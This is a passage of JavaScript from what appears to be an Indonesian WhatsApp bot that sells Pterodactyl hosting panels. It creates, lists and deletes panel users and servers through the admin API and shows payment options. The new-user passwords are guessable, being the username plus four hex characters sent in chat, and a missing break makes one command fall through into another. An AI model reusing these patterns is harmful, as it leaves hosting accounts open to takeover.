            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *Unlimited*
* CPU Server *Unlimited*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram Unlimited\",\"title\":\"Create\",\"id\":\".cpunliv4\"}"
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {userJid: m.sender, quoted: qpayment})

await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, {
  messageId: msgii.key.id
})
}
break
case "cpanel2": case "addpanel2": case "buatpanel2": {
if (!isOwner && !isPremium) return reply(msg.owner)
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama,6283XXX"))
if (!text.split(",")) return reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await anggazyy.onWhatsApp(ceknya)
if (check.length < 1) return reply("Nomor Buyyer Tidak Valid!")
global.panel2 = [buyyer, client]
let imgnya = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/pterodactyl.jpg")}, { upload: anggazyy.waUploadToServer })
global.panel = [text.toLowerCase()]
const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "Silahkan Pilih Ram Server Panel Yang Tersedia Di Bawah Ini"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *1GB*
* CPU Server *40%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 1GB\",\"title\":\"Create\",\"id\":\".cp1gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *2GB*
* CPU Server *60%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 2GB\",\"title\":\"Create\",\"id\":\".cp2gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *3GB*
* CPU Server *80%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
 text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 3GB\",\"title\":\"Create\",\"id\":\".cp3gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *4GB*
* CPU Server *100%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 4GB\",\"title\":\"Create\",\"id\":\".cp4gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *5GB*
* CPU Server *120%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 5GB\",\"title\":\"Create\",\"id\":\".cp5gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *6GB*
* CPU Server *140%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 6GB\",\"title\":\"Create\",\"id\":\".cp6gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *7GB*
* CPU Server *160%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 7GB\",\"title\":\"Create\",\"id\":\".cp7gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *8GB*
* CPU Server *180%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 8GB\",\"title\":\"Create\",\"id\":\".cp8gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *9GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 9GB\",\"title\":\"Create\",\"id\":\".cp9gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *10GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 10GB\",\"title\":\"Create\",\"id\":\".cp10gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *Unlimited*
* CPU Server *Unlimited*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram Unlimited\",\"title\":\"Create\",\"id\":\".cpunliv5\"}"
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {userJid: m.sender, quoted: qpayment})


await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, {
  messageId: msgii.key.id
})
}
break
case "cp1gbv4": case "cp2gbv4": case "cp3gbv4": case "cp4gbv4": case "cp5gbv4": case "cp6gbv4": case "cp7gbv4": case "cp8gbv4": case "cp9gbv4": case "cp10gbv4": case "cpunliv4": {
if (!isOwner && !isPremium) return reply(msg.owner)
if (global.panel == null) return reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv4") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv4") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv4") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv4") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv4") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv4") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv4") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv4") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv4") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv4") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isPremium) return reply(msg.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break
case "cp1gbv5": case "cp2gbv5": case "cp3gbv5": case "cp4gbv5": case "cp5gbv5": case "cp6gbv5": case "cp7gbv5": case "cp8gbv5": case "cp9gbv5": case "cp10gbv5": case "cpunliv5": {
if (!isOwner && !isPremium) return reply(msg.owner)
if (global.panel2 == null) return reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv5") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv5") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv5") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv5") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv5") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv5") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv5") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv5") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv5") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv5") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isPremium) return reply(msg.owner)
let username = global.panel2[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = global.panel2[1]
await reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${orang.split("@")[0]}`)
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel2 = null
}
break
case "listpanel": case "listp": case "listserver": {
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: messageText
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Buat Server Panel\",\"title\":\"Buat Panel\",\"id\":\".cpanel\"}" 
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Hapus Server Panel\",\"title\":\"Hapus Panel\",\"id\":\".delpanel\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "delpanel": {
let kontol = new Array()
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status
let namanya = `${s.name}`
let idnya = `${s.id} ⚡`
let ramnya = `${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}`
let cpunya = `${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`
let disknya = `${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}`
await kontol.push({ 
header: `ID Server ${idnya}`, title: `Nama Server : ${namanya}`, description: `Ram ${ramnya} | Cpu ${cpunya} | Disk ${disknya}`, id: `.respon_delpanel ${idnya}`})
}
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: '\nSilahkan Pilih *Server Panel* Yang Ingin Kamu Hapus, Untuk Melihat Lebih Detail Info Server Ketik *.listpanel*'
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "Total Server Panel : ${res.meta.pagination.count} Server",
rows: ${JSON.stringify(kontol)}
}]}`
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"List Server Panel\",\"title\":\"List Panel\",\"id\":\".listpanel\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "respon_delpanel": {
if (!isOwner && !isPremium) return reply(msg.owner)
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return reply("*ID Server/User* Tidak Ditemukan")
reply(`*Berhasil Menghapus Akun Panel ✅*
Nama Server : *${capital(sections[0])}*`)
}
break
case "sendpayment": case "payment": case "pay": case "listpayment": {
if (!isOwner) return reply(msg.owner)
let teksnya = `
Silahkan Pilih Payment Pembayaran Yang Tersedia Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Payment", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Dana", "title": "Dana Payment", "id": ".danapay" }, 
{ "header": "Ovo", "title": "Ovo Payment", "id": ".ovopay" }, 
{ "header": "Gopay", "title": "Gopay Payment", "id": ".gopaypay" }, 
{ "header": "QRIS", "title": "QRIS Payment", "id": ".qrispay" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "ambilq": {
let jsonData = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2)
reply(jsonData)
}
break
case "danapay": {
if (global.dana == false) return reply('Payment Dana Tidak Tersedia')
let teks = `
*Nomor Dana :*
${global.dana}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
anggazyy.sendText(m.chat, teks, qchanel)
}
break
case "ovopay": {
if (global.ovo == false) return reply('Payment Ovo Tidak Tersedia')
let teks = `
*Nomor Ovo :*
${global.ovo}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
anggazyy.sendText(m.chat, teks, qchanel)
}
break
case "gopaypay": {
if (global.gopay == false) return reply('Payment Gopay Tidak Tersedia')
let teks = `
*Nomor Gopay :*
${global.gopay}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
anggazyy.sendText(m.chat, teks, qchanel)
}
break
case "qrispay": {
if (global.qris == false) return reply('Payment Qris Tidak Tersedia')
reply('Memproses Mengambil QRIS, Tunggu Sebentar . . .')
let teks = `
*Untuk Pembayaran Melalui QRIS All Payment, Silahkan Scan Foto QRIS Diatas Ini*

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
anggazyy.sendMessage(m.chat, {image: global.qris, caption: teks}, {quoted: qchanel})
}
break
case "jadibot":{
  if (isGroup) return reply("Features Used Only For Private Chat!")
  //if (!isReseller) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  jadibot(anggazyy, m, from)
}
break
case "stopjadibot":{
  if (isGroup) return reply("Features Used Only For Private Chat!")
  //if (!isReseller) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  stopjadibot(anggazyy, from)
}
break
case "listjadibot":{
  if (isGroup) return reply("Features Used Only For Private Chat!")
  //if (!isReseller) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  listjadibot(anggazyy, m)
}
case "cpanel3": case "addpanel3": case "buatpanel3": {
if (!jangan) return reply("Group Belum Terdaftar")
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama,6283XXX"))
if (!text.split(",")) return reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await anggazyy.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
global.panel3 = [buyyer, client]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
